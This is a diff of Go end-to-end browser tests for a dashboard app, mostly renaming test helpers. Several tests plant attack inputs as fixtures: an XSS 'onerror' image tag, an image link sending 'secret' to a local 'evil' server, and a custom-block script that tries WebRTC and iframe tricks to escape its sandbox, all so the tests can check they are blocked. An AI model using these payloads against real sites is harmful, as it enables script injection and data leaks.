@@ -42,14 +42,14 @@ type hostTheme struct{ Theme, Bg, Ring, Radius string }
 func (e *Env) themesSeen() []hostTheme {
 	e.T.Helper()
 	var out []hostTheme
-	ps := e.processes()
+	ps := e.Procs()
 	slices.Reverse(ps)
 	for _, x := range ps {
 		if x.Command != "mark" {
 			continue
 		}
 		var res struct{ Seen string }
-		_ = json.Unmarshal(e.waitState(x.ID, "done").Result, &res)
+		_ = json.Unmarshal(e.WaitState(x.ID, "done").Result, &res)
 		var th hostTheme
 		_ = json.Unmarshal([]byte(res.Seen), &th)
 		out = append(out, th)
@@ -68,18 +68,19 @@ func TestRealBrowserSettings(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(f.dir, "versionfails"), nil, 0o644); err != nil {
 		t.Fatal(err)
 	}
-	e := newEnv(t, webNotesAgent(), func(c *app.Config) {
+	e := New(t, WithAgent(webNotesAgent()), WithConfig(func(c *app.Config) {
 		c.ACPBinaries = map[string]string{"goose": filepath.Join(f.dir, "goose")}
 		c.Sandbox = fakeDirSandbox{sandbox.New(), f.dir, nil}
-	})
+	}))
+
 	e.App.Providers.Checks(t.Context(), time.Now())
-	e.waitHealth("agent:goose", "error")
-	e.createProject("web", webNotesMark)
-	e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": themeProbe}, nil)
+	e.WaitHealth("agent:goose", "error")
+	e.Project("web", webNotesMark)
+	e.Must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": themeProbe}, nil)
 
 	b := newPlaywright(t)
 	b.call("browser_resize", map[string]any{"width": 1280, "height": 900})
-	b.open(e.URL + "/?token=" + token + "#/deck/look")
+	b.Open(e, "#/deck/look")
 	b.until("the appearance tab", `document.querySelector('[data-appearance]')`)
 	root := func(v string) string {
 		return `getComputedStyle(document.documentElement).getPropertyValue('` + v + `').trim()`
@@ -108,7 +109,7 @@ func TestRealBrowserSettings(t *testing.T) {
 	b.until("the custom block", `document.querySelector('[data-custom]')`)
 	dark := hostTheme{Theme: "dark", Bg: b.eval(root("--mantine-color-body")), Ring: b.eval(root("--mantine-color-grape-filled")),
 		Radius: b.eval(root("--mantine-radius-md"))}
-	e.waitFor("the custom block to report its theme", func() bool { return len(e.themesSeen()) > 0 })
+	e.Until("the custom block to report its theme", func() bool { return len(e.themesSeen()) > 0 })
 	if got := e.themesSeen()[0]; got != dark || got.Bg == "" || got.Radius == "" {
 		t.Fatalf("a custom block gets the scheme and the resolved variables of the host: %+v, want %+v", got, dark)
 	}
@@ -120,7 +121,7 @@ func TestRealBrowserSettings(t *testing.T) {
 	b.until("the light scheme", `document.documentElement.dataset.mantineColorScheme === 'light'`)
 	light := b.eval(root("--mantine-color-body"))
 	b.call("browser_tabs", map[string]any{"action": "select", "index": 0})
-	e.waitFor("the custom block to hear of the light scheme in place", func() bool {
+	e.Until("the custom block to hear of the light scheme in place", func() bool {
 		ts := e.themesSeen()
 		return len(ts) > 1 && ts[len(ts)-1].Theme == "light"
 	})
@@ -129,7 +130,7 @@ func TestRealBrowserSettings(t *testing.T) {
 	}
 
 	_, tok := e.token("terminal", "deck.*")
-	if code, out := e.callWith(tok, "deck.project_create", map[string]any{"name": "notes", "manifest": draftManifest}); code != 200 {
+	if code, out := e.As(tok).Call("deck.project_create", map[string]any{"name": "notes", "manifest": draftManifest}); code != 200 {
 		t.Fatalf("project_create: %d %s", code, out)
 	}
 	tab := func(name string) {
@@ -140,7 +141,7 @@ func TestRealBrowserSettings(t *testing.T) {
 	b.open(e.URL + "/#/deck/settings?tab=Modules")
 	b.until("the projects tab", itemOf("notes", "enabling grants"))
 	b.reviewAndEnable("notes")
-	e.waitFor("the enabled draft", func() bool { return e.project("notes").Status == "enabled" })
+	e.Until("the enabled draft", func() bool { return e.project("notes").Status == "enabled" })
 	b.shot("settings-draft")
 	b.open(e.URL + "/#/deck/settings?tab=Modules")
 	b.until("the enabled draft", itemOf("notes", "")+" && !"+itemOf("notes", "draft"))
@@ -197,7 +198,7 @@ func TestRealBrowserSettings(t *testing.T) {
 		Name    string
 		Revoked bool
 	}
-	e.must("deck.tokens_list", nil, &toks)
+	e.Must("deck.tokens_list", nil, &toks)
 	for _, x := range toks {
 		if x.Name == "shortcuts" && x.Revoked {
 			t.Fatal("the token is not revoked before the owner says yes")
@@ -229,7 +230,7 @@ func TestRealBrowserSettings(t *testing.T) {
 				Models                 []string
 			}
 		}
-		e.must("deck.models_list", nil, &m)
+		e.Must("deck.models_list", nil, &m)
 		for _, a := range m.Assignments {
 			if a.Project == "web" && a.Command == "score" && a.Role == "agent" {
 				return strings.Join(a.Models, ",")
@@ -237,7 +238,7 @@ func TestRealBrowserSettings(t *testing.T) {
 		}
 		return ""
 	}
-	e.waitFor("the model picked in the row of the command", func() bool { return strings.HasPrefix(assigned(), "quiet,") })
+	e.Until("the model picked in the row of the command", func() bool { return strings.HasPrefix(assigned(), "quiet,") })
 
 	b.call("browser_resize", map[string]any{"width": 390, "height": 844})
 	b.open(e.URL + "/#/deck/settings?tab=Modules")
@@ -286,19 +287,19 @@ func TestRealBrowserDocuments(t *testing.T) {
 	}
 	checkBuiltClient(t)
 	evil := newService(t, func(w http.ResponseWriter, r *http.Request, n int) { w.Write([]byte("GIF89a")) })
-	e := newEnv(t, nil)
-	e.createProject("web", docsManifest)
+	e := New(t)
+	e.Project("web", docsManifest)
 	var d struct{ ID int64 }
-	e.must("deck.document_save", map[string]any{"project": "web", "name": "notes/criteria.md", "kind": "doc",
+	e.Must("deck.document_save", map[string]any{"project": "web", "name": "notes/criteria.md", "kind": "doc",
 		"text": "# Criteria\n\n- **short** <img src=x onerror=alert(1)>\n\n![seen](" + evil.URL + "/pixel?d=secret)"}, &d)
 	for _, text := range []string{"<p>one</p>", "<p>two</p>"} {
-		e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": text}, nil)
+		e.Must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": text}, nil)
 	}
-	e.must("deck.records_upsert", map[string]any{"project": "web", "collection": "notes", "records": jsonl(map[string]any{"title": "alpha", "note": "a **bold** note"})}, nil)
+	e.Must("deck.records_upsert", map[string]any{"project": "web", "collection": "notes", "records": jsonl(map[string]any{"title": "alpha", "note": "a **bold** note"})}, nil)
 
 	b := newPlaywright(t)
 	b.call("browser_resize", map[string]any{"width": 1280, "height": 900})
-	b.open(e.URL + "/?token=" + token + "#/p/web/main")
+	b.Open(e, "#/p/web/main")
 	b.until("the text of a list as it is", `[...document.querySelectorAll('[data-item]')].some((x) => x.innerText.includes('a **bold** note'))`)
 	b.until("the named document on the main screen", `document.querySelector('[data-document="notes/criteria.md"] [data-markdown] h1')?.innerText === 'Criteria'`)
 	if got := b.eval(`String(!!document.querySelector('[data-markdown] img[onerror]'))`); got != "false" {
@@ -325,7 +326,7 @@ func TestRealBrowserDocuments(t *testing.T) {
 		Text     string
 		Revision int64
 	}
-	e.must("deck.document_get", map[string]any{"document": d.ID}, &got)
+	e.Must("deck.document_get", map[string]any{"document": d.ID}, &got)
 	if got.Text != "# Criteria\n\n- *brief*" || got.Revision != 2 {
 		t.Fatalf("the edit is a new revision: %+v", got)
 	}
@@ -334,7 +335,7 @@ func TestRealBrowserDocuments(t *testing.T) {
 	b.shot("document-page")
 	b.eval(`(document.querySelector('[data-revert="1"]').click(), '')`)
 	b.until("the first text back", `document.querySelector('[data-markdown] strong')?.innerText === 'short'`)
-	e.must("deck.document_get", map[string]any{"document": d.ID}, &got)
+	e.Must("deck.document_get", map[string]any{"document": d.ID}, &got)
 	if got.Revision != 3 {
 		t.Fatalf("going back is a new revision: %+v", got)
 	}
@@ -343,7 +344,7 @@ func TestRealBrowserDocuments(t *testing.T) {
 		ID   int64
 		Name string
 	}
-	e.must("deck.documents_list", map[string]any{"project": "web"}, &ds)
+	e.Must("deck.documents_list", map[string]any{"project": "web"}, &ds)
 	for _, x := range ds {
 		if x.Name == "manifest.json" {
 			b.open(e.URL + "/#/p/web/document/" + fmt.Sprint(x.ID))
@@ -380,8 +381,8 @@ func TestRealBrowserJournal(t *testing.T) {
 		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
 	}
 	checkBuiltClient(t)
-	e := newEnv(t, nil)
-	pid := e.createProject("web", webNotesMark)
+	e := New(t)
+	pid := e.Project("web", webNotesMark)
 	if err := os.MkdirAll(filepath.Join(e.App.Home.Data(pid), "sub"), 0o700); err != nil {
 		t.Fatal(err)
 	}
@@ -393,9 +394,9 @@ func TestRealBrowserJournal(t *testing.T) {
 	}
 	b := newPlaywright(t)
 	b.call("browser_resize", map[string]any{"width": 390, "height": 844})
-	b.open(e.URL + "/?token=" + token + "#/deck/schedule")
+	b.Open(e, "#/deck/schedule")
 	b.until("the schedule tabs", `[...document.querySelectorAll('[role=tab]')].map((x) => x.innerText.trim()).join(' ') === 'Schedule Runs'`)
-	b.open(e.URL + "/?token=" + token + "#/deck/files")
+	b.Open(e, "#/deck/files")
 	b.until("the tabs of files", `[...document.querySelectorAll('[role=tab]')].map((x) => x.innerText.trim()).join(' ') === 'Files Snapshots'`)
 	const visible = `[...document.querySelectorAll('[data-place]')].filter((x) => x.offsetParent)`
 	b.until("the folders of the modules as folder tiles", visible+`.some((x) => x.innerText.toLowerCase().includes('web'))`)
@@ -411,12 +412,12 @@ func TestRealBrowserJournal(t *testing.T) {
 	b.shot("data-folder-phone")
 	b.eval(`(document.querySelector('[data-crumb-up]').click(), '')`)
 	b.until("one step up", visible+`.some((x) => x.innerText.trim() === 'sub')`)
-	b.open(e.URL + "/?token=" + token + "#/deck/files?tab=Snapshots")
+	b.Open(e, "#/deck/files?tab=Snapshots")
 	take := `[...document.querySelectorAll('button')].find((x) => x.offsetParent && x.innerText.trim() === 'Take a snapshot')`
 	b.until("the snapshot button", take)
 	b.eval(`(` + take + `.click(), '')`)
 	b.until("the new snapshot in the list", `[...document.querySelectorAll('tr')].some((r) => r.offsetParent && r.innerText.includes('deck-'))`)
-	b.open(e.URL + "/?token=" + token + "#/deck/files?path=web%2Ffiles")
+	b.Open(e, "#/deck/files?path=web%2Ffiles")
 	b.eval(`(window.saved = [], HTMLAnchorElement.prototype.click = function () { fetch(this.href).then((r) => r.blob()).then(async (b) => { window.saved.push(b.type + ' ' + this.download + '=' + await b.text()); }); }, '')`)
 	b.until("the switch of the view of files", `[...document.querySelectorAll('[data-files-mode] input')].some((x) => x.value === 'list')`)
 	b.eval(`([...document.querySelectorAll('[data-files-mode] input')].find((x) => x.value === 'list').click(), '')`)
@@ -437,22 +438,22 @@ func TestRealBrowserRework(t *testing.T) {
 		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
 	}
 	checkBuiltClient(t)
-	e := newEnv(t, ok)
-	p := e.createProject("jobs", testManifest([]string{agentCommand("job", "")}, nil))
-	job := e.run(p, "job")
-	e.waitState(job, "done")
+	e := New(t, WithAgent(ok))
+	p := e.Project("jobs", testManifest([]string{agentCommand("job", "")}, nil))
+	job := e.Run(p, "job")
+	e.WaitState(job, "done")
 	b := newPlaywright(t)
-	b.open(e.URL + "/?token=" + token + "#/deck/process/" + fmt.Sprint(job))
+	b.Open(e, "#/deck/process/"+fmt.Sprint(job))
 	b.until("the rework button", `document.querySelector('[data-verb="rework"]')`)
 	b.eval(`(document.querySelector('[data-verb="rework"]').click(), '')`)
 	b.until("the remark field", `document.querySelector('input[placeholder="What to change"]')`)
 	b.type_(`document.querySelector('input[placeholder="What to change"]')`, "shorter, please")
 	b.eval(`([...document.querySelectorAll('button')].find((x) => x.innerText === 'Send').click(), '')`)
-	e.waitFor("the second turn with the remark", func() bool {
+	e.Until("the second turn with the remark", func() bool {
 		cs := e.Fake.Calls()
 		return len(cs) == 2 && strings.Contains(cs[1].Prompt, "shorter, please")
 	})
-	e.waitState(job, "done")
+	e.WaitState(job, "done")
 }
 
 // TestRealBrowserScreenKeepsItsStateOnReturn: a screen read again when the owner comes back to it keeps the tab
@@ -462,12 +463,12 @@ func TestRealBrowserScreenKeepsItsStateOnReturn(t *testing.T) {
 		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
 	}
 	checkBuiltClient(t)
-	e := newEnv(t, nil)
-	e.createProject("web", strings.Replace(webNotes, `{"type": "form", "title": "Score a title", "command": "score"},`,
+	e := New(t)
+	e.Project("web", strings.Replace(webNotes, `{"type": "form", "title": "Score a title", "command": "score"},`,
 		`{"type": "tabs", "tabs": [{"title": "Board", "blocks": [{"type": "stat", "title": "Notes", "source": {"collection": "notes"}}]},
 			{"title": "Score", "blocks": [{"type": "form", "title": "Score a title", "command": "score"}]}]},`, 1))
 	b := newPlaywright(t)
-	b.open(e.URL + "/?token=" + token + "#/p/web/main")
+	b.Open(e, "#/p/web/main")
 	b.until("the tabs", `[...document.querySelectorAll('[role="tab"]')].some(x => x.innerText === 'Score')`)
 	b.eval(`[...document.querySelectorAll('[role="tab"]')].find(x => x.innerText === 'Score').click(), ''`)
 	b.until("the form of the second tab", `document.querySelector('[data-field="title"]')?.offsetParent`)
@@ -496,18 +497,19 @@ func TestRealBrowserLogReadsEasily(t *testing.T) {
 	}
 	checkBuiltClient(t)
 	long := `{"id":1327,"project":"btc-forecast","command":"collect","state":"done","result":"` + strings.Repeat("a-long-value-without-spaces-", 20) + `"}`
-	e := newEnv(t, func(ctx context.Context, c *Call) provider.Result {
+	e := New(t, WithAgent(func(ctx context.Context, c *Call) provider.Result {
 		c.Req.OnEvent(provider.Event{Kind: provider.EventTool, ID: "t1", Title: "mcp__deck__process_get", Text: `{"process":1327,"fields":["state","result"]}`})
 		c.Req.OnEvent(provider.Event{Kind: provider.EventToolUpdate, ID: "t1", Status: "completed", Text: long})
 		c.Req.OnEvent(provider.Event{Kind: provider.EventMessage, Text: "The run is **done**:\n\n- one\n- two"})
 		return provider.Result{Text: "{}"}
-	})
-	p := e.createProject("jobs", testManifest([]string{agentCommand("job", "")}, nil))
-	job := e.run(p, "job")
-	e.waitState(job, "done")
+	}))
+
+	p := e.Project("jobs", testManifest([]string{agentCommand("job", "")}, nil))
+	job := e.Run(p, "job")
+	e.WaitState(job, "done")
 	b := newPlaywright(t)
 	b.call("browser_resize", map[string]any{"width": 390, "height": 844})
-	b.open(e.URL + "/?token=" + token + "#/deck/process/" + fmt.Sprint(job))
+	b.Open(e, "#/deck/process/"+fmt.Sprint(job))
 	b.until("the input of the tool laid out as JSON", `document.querySelector('[data-line="tool"] [data-json]')?.innerText.includes('"process": 1327,\n')`)
 	b.until("the answer of the tool laid out and wrapped", `(() => { const x = document.querySelector('[data-line="tool"] [data-tool-result]'); return x && x.innerText.includes('"state": "done"') && x.scrollWidth <= x.clientWidth + 1 })()`)
 	b.until("the message of the agent in markdown", `document.querySelector('[data-line="message"] strong')?.innerText === 'done' && document.querySelector('[data-line="message"] li')?.innerText === 'one'`)
@@ -524,18 +526,18 @@ func TestRealBrowserBoardMovesACardToALane(t *testing.T) {
 		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
 	}
 	checkBuiltClient(t)
-	e := newEnv(t, ok)
-	e.createProject("work", boardManifest)
-	e.must("deck.records_upsert", map[string]any{"project": "work", "collection": "tasks", "records": `{"title": "a", "status": "doing"}` + "\n" + `{"title": "b", "status": "todo"}`}, nil)
+	e := New(t, WithAgent(ok))
+	e.Project("work", boardManifest)
+	e.Must("deck.records_upsert", map[string]any{"project": "work", "collection": "tasks", "records": `{"title": "a", "status": "doing"}` + "\n" + `{"title": "b", "status": "todo"}`}, nil)
 	b := newPlaywright(t)
 	b.call("browser_resize", map[string]any{"width": 1400, "height": 900})
-	b.open(e.URL + "/?token=" + token + "#/p/work/board")
+	b.Open(e, "#/p/work/board")
 	b.until("three lanes with their cards", `document.querySelectorAll('[data-board] [data-lane]').length === 3 && document.querySelector('[data-lane="todo"] [data-card]')`)
 	b.eval(`(() => { const dt = new DataTransfer(); const card = document.querySelector('[data-lane="todo"] [data-card]');
 		card.dispatchEvent(new DragEvent('dragstart', {dataTransfer: dt, bubbles: true}));
 		document.querySelector('[data-lane="done"]').dispatchEvent(new DragEvent('drop', {dataTransfer: dt, bubbles: true})); return '' })()`)
 	b.until("the card in its new lane at once", `document.querySelector('[data-lane="done"] [data-card]')`)
-	e.waitFor("the move pressed with the lane", func() bool {
+	e.Until("the move pressed with the lane", func() bool {
 		for _, c := range e.Fake.Calls() {
 			if strings.Contains(c.Prompt, `"status":"done"`) {
 				return true
@@ -547,7 +549,7 @@ func TestRealBrowserBoardMovesACardToALane(t *testing.T) {
 	for i := range 40 {
 		many += fmt.Sprintf(`{"title": "t%d", "status": "todo"}`+"\n", i)
 	}
-	e.must("deck.records_upsert", map[string]any{"project": "work", "collection": "tasks", "records": many}, nil)
+	e.Must("deck.records_upsert", map[string]any{"project": "work", "collection": "tasks", "records": many}, nil)
 	b.until("a long lane no higher than the screen, with a scroll of its own", `(() => { const l = document.querySelector('[data-lane="todo"]');
 		return l.querySelectorAll('[data-card]').length >= 40 && l.getBoundingClientRect().height <= innerHeight && l.scrollHeight > l.clientHeight })()`)
 	b.shot("board")
@@ -576,17 +578,17 @@ func TestRealBrowserCustomBlockOpensWindowsOfDeck(t *testing.T) {
 		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
 	}
 	checkBuiltClient(t)
-	e := newEnv(t, webNotesAgent())
+	e := New(t, WithAgent(webNotesAgent()))
 	m := strings.Replace(webNotesMark, `{"type": "form", "title": "Score a title", "command": "score"},`,
 		`{"type": "form", "title": "Score a title", "command": "score"}, {"type": "dialog", "name": "note-help", "title": "Help", "blocks": [{"type": "stat", "title": "Notes", "source": {"collection": "notes"}}]},`, 1)
-	e.createProject("web", m)
-	e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": customWindows}, nil)
+	e.Project("web", m)
+	e.Must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": customWindows}, nil)
 	b := newPlaywright(t)
 	b.call("browser_resize", map[string]any{"width": 1200, "height": 800})
-	b.open(e.URL + "/?token=" + token + "#/p/web/main")
+	b.Open(e, "#/p/web/main")
 	b.until("the window of deck the block opened", `location.hash.includes('dialog=note-help') && document.querySelector('[data-dialog="note-help"]')`)
 	b.until("the frame over the whole screen", `(() => { const r = document.querySelector('iframe[data-custom]').getBoundingClientRect(); return r.width >= innerWidth - 1 && r.height >= innerHeight - 1 })()`)
-	e.waitFor("the report of the block", func() bool {
+	e.Until("the report of the block", func() bool {
 		for _, c := range e.Fake.Calls() {
 			if strings.Contains(c.Prompt, `\"outside\":true`) && strings.Contains(c.Prompt, `\"mode\":\"fullscreen\"`) {
 				return true
@@ -611,14 +613,14 @@ func TestRealBrowserCustomBlockGetsItsParams(t *testing.T) {
 		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
 	}
 	checkBuiltClient(t)
-	e := newEnv(t, webNotesAgent())
+	e := New(t, WithAgent(webNotesAgent()))
 	chart := `"document": "custom/chart.html", "source": {"collection": "notes", "sort": "title"},`
-	e.createProject("web", strings.NewReplacer(`{"name": "main", "title": "Web", "blocks": [`, `{"name": "main", "title": "Web", "params": {"kind": "string"}, "blocks": [`,
+	e.Project("web", strings.NewReplacer(`{"name": "main", "title": "Web", "blocks": [`, `{"name": "main", "title": "Web", "params": {"kind": "string"}, "blocks": [`,
 		chart, chart+` "params": {"mode": "voice", "kind": "=param.kind"},`).Replace(webNotesMark))
-	e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": customParams}, nil)
+	e.Must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": customParams}, nil)
 	b := newPlaywright(t)
-	b.open(e.URL + "/?token=" + token + "#/p/web/main?kind=video")
-	e.waitFor("the params the block got", func() bool {
+	b.Open(e, "#/p/web/main?kind=video")
+	e.Until("the params the block got", func() bool {
 		for _, c := range e.Fake.Calls() {
 			if strings.Contains(c.Prompt, `\"mode\":\"voice\"`) && strings.Contains(c.Prompt, `\"kind\":\"video\"`) {
 				return true
@@ -657,20 +659,20 @@ func TestRealBrowserCustomBlockShowsAPictureOfItsModule(t *testing.T) {
 
 // customPictureIn shows the picture block in a browser and checks that it reads its file without a refusal shown.
 func customPictureIn(t *testing.T, browser ...string) {
-	e := newEnv(t, webNotesAgent())
-	p := e.createProject("web", webNotesMark)
-	e.createProject("other", plainManifest)
+	e := New(t, WithAgent(webNotesAgent()))
+	p := e.Project("web", webNotesMark)
+	e.Project("other", plainManifest)
 	theirs := e.upload("other", "theirs.png", "image/png", "theirs")
 	var pic bytes.Buffer
 	_ = png.Encode(&pic, image.NewRGBA(image.Rect(0, 0, 3, 2)))
 	data := deckhome.Layout(e.App.Cfg.Home).Data(p)
 	_ = os.MkdirAll(filepath.Join(data, "pics"), 0o700)
 	_ = os.WriteFile(filepath.Join(data, "pics", "dot.png"), pic.Bytes(), 0o600)
-	e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": fmt.Sprintf(customPicture, theirs)}, nil)
+	e.Must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": fmt.Sprintf(customPicture, theirs)}, nil)
 	b := newPlaywright(t, browser...)
-	b.open(e.URL + "/?token=" + token + "#/p/web/main")
+	b.Open(e, "#/p/web/main")
 	b.until("the custom block", `document.querySelector('iframe[data-custom]')`)
-	e.waitFor("the report of the block", func() bool {
+	e.Until("the report of the block", func() bool {
 		for _, c := range e.Fake.Calls() {
 			if strings.Contains(c.Prompt, `\"width\":3`) && strings.Contains(c.Prompt, `\"other\":\"refused: `) {
 				return true
@@ -690,12 +692,12 @@ func TestRealBrowserTheChatOpensBesideTheScreenInANewTopic(t *testing.T) {
 		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
 	}
 	checkBuiltClient(t)
-	e := newEnv(t, ok)
-	e.createProject("work", boardManifest)
-	e.must("deck.records_upsert", map[string]any{"project": "work", "collection": "tasks", "records": `{"title": "a", "status": "doing"}`}, nil)
+	e := New(t, WithAgent(ok))
+	e.Project("work", boardManifest)
+	e.Must("deck.records_upsert", map[string]any{"project": "work", "collection": "tasks", "records": `{"title": "a", "status": "doing"}`}, nil)
 	b := newPlaywright(t)
 	b.call("browser_resize", map[string]any{"width": 1400, "height": 900})
-	b.open(e.URL + "/?token=" + token + "#/p/work/board")
+	b.Open(e, "#/p/work/board")
 	b.until("the board", `document.querySelector('[data-board] [data-card]')`)
 	b.eval(`(document.querySelector('[data-chat-toggle]').click(), '')`)
 	b.until("the chat beside the board", `document.querySelector('[data-chat-panel] [data-chat-input]') && document.querySelector('[data-board]')`)
@@ -739,9 +741,9 @@ const F = "ifr" + "ame";
 const T = (way) => "<" + F + " srcdoc='" + leaks(way).replace(/&/g, "&amp;").replace(/'/g, "&#39;") + "'></" + F + ">";
 const frame = (way, f) => { f.srcdoc = leaks(way); return f; };
 `
-	e := newEnv(t, webNotesAgent())
-	e.createProject("web", webNotesMark)
-	e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": `<!doctype html><html><body><script>
+	e := New(t, WithAgent(webNotesAgent()))
+	e.Project("web", webNotesMark)
+	e.Must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": `<!doctype html><html><body><script>
 ` + lib + `
 try { const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:" + at.window }] }); pc.createDataChannel("l"); pc.createOffer().then((o) => pc.setLocalDescription(o)); } catch (e) {}
 const twice = (v) => { let n = 0; return { toString() { return n++ ? v : "div"; } }; };
@@ -794,9 +796,9 @@ await app.connect();
 await app.callServerTool({ name: "web.mark", arguments: { text: "made [" + window.made.join(",") + "]" } });
 </script></body></html>`}, nil)
 	b := newPlaywright(t)
-	b.open(e.URL + "/?token=" + token + "#/p/web/main")
+	b.Open(e, "#/p/web/main")
 	b.until("the custom block", `document.querySelector('iframe[data-custom]')`)
-	e.waitFor("the block to tell the frames it made", func() bool {
+	e.Until("the block to tell the frames it made", func() bool {
 		for _, c := range e.Fake.Calls() {
 			if m := regexp.MustCompile(`made \[([\w,]*)\]`).FindStringSubmatch(c.Prompt); m != nil {
 				if m[1] != "" {
@@ -821,8 +823,8 @@ await app.callServerTool({ name: "web.mark", arguments: { text: "made [" + windo
 try { const f = frame("root", document.createElement(F)); document.removeChild(document.documentElement); document.append(f); } catch (e) {}
 </script></body></html>`},
 	} {
-		e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": c.html}, nil)
-		b.open(fmt.Sprintf("%s/?token=%s&case=%d#/p/web/main", e.URL, token, i))
+		e.Must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": c.html}, nil)
+		b.Open(e, fmt.Sprintf("&case=%d#/p/web/main", i))
 		b.until("the custom block again", `document.querySelector('iframe[data-custom]')`)
 		wait(c.name)
 	}
@@ -854,17 +856,17 @@ func TestRealBrowserReadableTable(t *testing.T) {
 		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
 	}
 	checkBuiltClient(t)
-	e := newEnv(t, nil)
-	e.createProject("ops", readableManifest)
+	e := New(t)
+	e.Project("ops", readableManifest)
 	now := time.Now().UTC().Format(time.RFC3339)
-	e.must("deck.records_upsert", map[string]any{"project": "ops", "collection": "jobs", "records": jsonl(
+	e.Must("deck.records_upsert", map[string]any{"project": "ops", "collection": "jobs", "records": jsonl(
 		map[string]any{"name": "backup", "status": "error", "why": "the disk is full: 0 bytes left on /backup", "note": strings.Repeat("a long note that goes on and on ", 20),
 			"host": "nas", "region": "home", "started": now},
 		map[string]any{"name": "mail", "status": "ok", "host": "vps", "started": now})}, nil)
 
 	b := newPlaywright(t)
 	b.call("browser_resize", map[string]any{"width": 1440, "height": 900})
-	b.open(e.URL + "/?token=" + token + "#/p/ops/jobs")
+	b.Open(e, "#/p/ops/jobs")
 	b.until("the table", `document.querySelectorAll('[data-table] tbody tr').length === 2`)
 	heads := `[...document.querySelectorAll('[data-table] th')].map((x) => x.innerText.trim()).filter(Boolean).join('|')`
 	if got := b.eval(heads); got != "Name|Status|Note|Host" {
